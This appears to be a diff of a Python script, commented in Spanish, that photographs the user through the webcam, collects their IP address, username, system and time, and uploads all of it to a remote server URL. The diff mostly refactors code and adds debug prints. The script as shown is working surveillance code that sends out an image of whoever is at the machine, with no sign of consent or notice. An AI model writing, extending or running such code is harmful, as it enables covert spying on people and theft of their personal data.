@@ -14,9 +14,6 @@ def capturar_webcam(path='webcam.jpg'):
         ret, frame = cam.read()
         if ret:
             cv2.imwrite(path, frame)
-        else:
-            with open(path, 'wb') as f:
-                f.write(b'')
         cam.release()
     except:
         with open(path, 'wb') as f:
@@ -31,26 +28,24 @@ def recolectar_info():
     except:
         ip = "No obtenido"
     hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    return {
-        'ip': ip,
-        'usuario': usuario,
-        'sistema': sistema,
-        'hora': hora
-    }
+    return {'ip': ip, 'usuario': usuario, 'sistema': sistema, 'hora': hora}
 
 def enviar_reporte():
+    # Captura webcam
     capturar_webcam("webcam.jpg")
     datos = recolectar_info()
-    print("📤 Enviando datos:", datos)
+    files = {"imagen": open("webcam.jpg", "rb")}
+
+    # Trazas de debug
+    print("📤 DATOS que envío:", datos)
+    print("📎 FILES que envío:", files)
 
     try:
-        with open("webcam.jpg", "rb") as f:
-            files = {"imagen": f}
-            response = requests.post(SERVER_URL, data=datos, files=files)
-            print("✅ Respuesta del servidor:", response.status_code)
-            print("🔁 Respuesta completa:", response.text)
+        resp = requests.post(SERVER_URL, data=datos, files=files)
+        print("✅ Código respuesta:", resp.status_code)
+        print("🔁 Texto respuesta:", resp.text)
     except Exception as e:
-        print("❌ Error al enviar reporte:", e)
+        print("❌ Error al enviar:", e)
 
 if __name__ == "__main__":
     enviar_reporte()
